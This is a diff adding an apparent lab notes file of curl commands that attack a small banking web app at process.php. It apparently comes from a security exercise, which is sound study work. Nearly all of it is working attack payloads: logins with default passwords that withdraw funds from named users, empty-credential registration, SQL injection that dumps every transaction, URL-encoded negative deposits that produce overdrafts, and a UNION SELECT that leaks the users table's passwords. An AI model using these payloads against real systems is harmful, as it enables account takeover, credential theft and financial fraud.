@@ -1,0 +1,50 @@
+DEFAULT PASSWORD:
+#Try to alter account of three default user with default password
+curl -o - "http://server/process.php?user=jelena&pass=abcdef&amount=10&drop=withdraw"
+curl -o - "http://server/process.php?user=kate&pass=abcdef&amount=10&drop=withdraw"
+curl -o - "http://server/process.php?user=john&pass=abcdef&amount=10&drop=withdraw"
+
+#Check if attack had any effects
+curl -sS "10.1.5.2/process.php?user=jelena&pass=abcdef&drop=balance"
+curl -sS "10.1.5.2/process.php?user=kate&pass=$abcdef&drop=balance"
+curl -sS "10.1.5.2/process.php?user=john&pass=$abcdef&drop=balance"
+
+
+EMPTY USER AND PASSWORD, JUST EMPTY USER:
+#Try to register empty user and password
+curl -sS "10.1.5.2/process.php?user=''$USER&pass=''&drop=register"
+
+#Try to register user with empty password 
+curl -sS "10.1.5.2/process.php?user=notEmpty&pass=''&drop=register"
+
+
+LIST ALL TRANSACTIONS:
+curl -o - "http://server/process.php?user=%27+OR+TRUE+OR+user%3D%27&pass=&amount=&drop=balance"
+
+
+OVERDRAFT USING PERCENT:
+#register, deposit, try to withdraw and then display. Can also just withdraw and display on already existing account
+curl -sS "10.1.5.2/process.php?user=MinUserPercent&pass=MinPassPercent&drop=register" & sleep 1
+
+curl -sS "10.1.5.2/process.php?user=MinUserPercent&pass=MinPassPercent&drop=deposit&amount=100" & sleep 1
+
+curl -sS "10.1.5.2/process.php?user=MinUserPercent&pass=MinPassPercent&drop=deposit&amount=%2D%31%30%30%30%30%30%30" & sleep 1
+
+curl -sS "10.1.5.2/process.php?user=MinUserPercent&pass=MinPassPercent&drop=balance"
+
+
+OVERDRAFT USING PHP char:
+#Does not work for now, same as using percent just replace the third command by this
+curl -sS "10.1.5.2/process.php?user=MinUserPercent&pass=MinPassPercent&drop=deposit&amount=10'+char(45,49,48,48,48,48,48)+'" & sleep 1
+
+
+SIMPLE OVERDRAFT:
+#select any account, try to withdraw as much as possible
+curl -sS "10.1.5.2/process.php?user=$USER&pass=$PASS&drop=withdraw&amount=200" & sleep 1
+
+
+LEAK PASSWORD SIMPLE:
+#Easily defeated
+curl -sS "10.1.5.2/process.php?user=' union select 1,2,pass from users; --"
+
+
